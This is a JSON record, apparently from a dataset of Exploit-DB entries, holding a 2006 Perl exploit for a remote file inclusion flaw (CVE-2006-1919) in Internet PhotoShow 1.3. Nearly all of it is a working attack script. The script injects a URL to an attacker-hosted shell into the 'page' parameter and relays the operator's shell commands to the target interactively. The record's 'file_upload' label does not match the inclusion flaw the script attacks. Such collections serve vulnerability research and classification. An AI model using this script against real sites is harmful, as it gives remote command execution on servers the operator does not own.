{
  "id": "1694",
  "title": "Internet PhotoShow 1.3 - &#039;page&#039; Remote File Inclusion",
  "cve": "CVE-2006-1919",
  "vuln_type": "file_upload",
  "code": "#!/usr/bin/perl\r\n#\r\n# Exploit by Hessam-x (www.hessamx.net)\r\n# sub usage()\r\n# {\r\n #print \" Usage: perl hx.pl [host] [cmd shell] [cmd shell variable]\\r\\n\\n\";\r\n #print \" example : perl hx.pl www.milw0rm.com milw0rm.com/hx.txt cmd\";\r\n #exit();\r\n #}\r\n######################################################\r\n#  ___ ___                __                         #\r\n# /   |   \\_____    ____ |  | __ ___________________ #\r\n#/    ~    \\__  \\ _/ ___\\|  |/ // __ \\_  __ \\___   / #\r\n#\\    Y    // __ \\\\  \\___|    <\\  ___/|  | \\//    /  #\r\n# \\___|_  /(____  )\\___  >__|_ \\\\___  >__|  /_____ \\ #\r\n#       \\/      \\/     \\/     \\/    \\/            \\/ #\r\n#             Iran Hackerz Security Team             #\r\n#               WebSite: www.hackerz.ir              #\r\n#                 DeltaHAcking Team                  #\r\n#           website: www.deltahacking.com            #\r\n######################################################\r\n#  Internet PhotoShow Remote File Inclusion Exploit  #\r\n######################################################\r\n# upload a shell with this xpl:\r\n# wget http://shell location/\r\nuse LWP::UserAgent;\r\nprint \"-------------------------------------------\\n\";\r\nprint \"=             Internet PhotoShow          =\\n\";\r\nprint \"=       By Hessam-x  - www.hackerz.ir     =\\n\";\r\nprint \"-------------------------------------------\\n\\n\";\r\n\r\n\r\n$bPath = $ARGV[0];\r\n$cmdo = $ARGV[1];\r\n$bcmd = $ARGV[2];\r\n\r\nif($bPath!~/http:\\/\\// || $cmdo!~/http:\\/\\// || !$bcmd){usage()}\r\n\r\n\r\n\r\nwhile()\r\n{\r\n       print \"Hessam-x@PhotoShow \\$\";\r\nwhile(<STDIN>)\r\n       {\r\n               $cmd=$_;\r\n               chomp($cmd);\r\n\r\n$xpl = LWP::UserAgent->new() or die;\r\n$req = HTTP::Request->new(GET =>$bpath.'index.php?page='.$cmdo.'?&'.$bcmd.'='.$cmd)or die \"\\n[-] Could not connect !\\n\";\r\n\r\n$res = $xpl->request($req);\r\n\r\n$return = $res->content;\r\n$return =~ tr/[\\n]/[\u00ea]/;\r\n\r\nif (!$cmd) {print \"\\n[!] Please type a Command\\n\\n\"; $return =\"\";}\r\n\r\nelsif ($return =~/failed to open stream: HTTP request failed!/)\r\n       {print \"\\n[-] Could Not Connect to cmd Host\\n\";exit}\r\nelsif ($return =~/^<b>Fatal.error/) {print \"\\n[-] Invalid Command\\n\"}\r\n\r\nif($return =~ /(.*)/)\r\n\r\n\r\n{\r\n       $freturn = $1;\r\n       $freturn=~ tr/[\u00ea]/[\\n]/;\r\n       print \"\\r\\n$freturn\\n\\r\";\r\n       last;\r\n}\r\n\r\nelse {print \"Hessam-x@PhotoShow \\$\";}}}last;\r\n\r\n\r\nsub usage()\r\n {\r\nprint \"[!] Usage : hx.pl [host] [cmd shell location] [cmd shell variable]\\n\";\r\nprint \" - E.g : hx.pl http://www.milw0rm.com http://www.milw0rm.com/shell.txt cmd\\n\";\r\n exit();\r\n }\r\n\r\n# milw0rm.com [2006-04-18]",
  "url": "https://www.exploit-db.com/exploits/1694"
}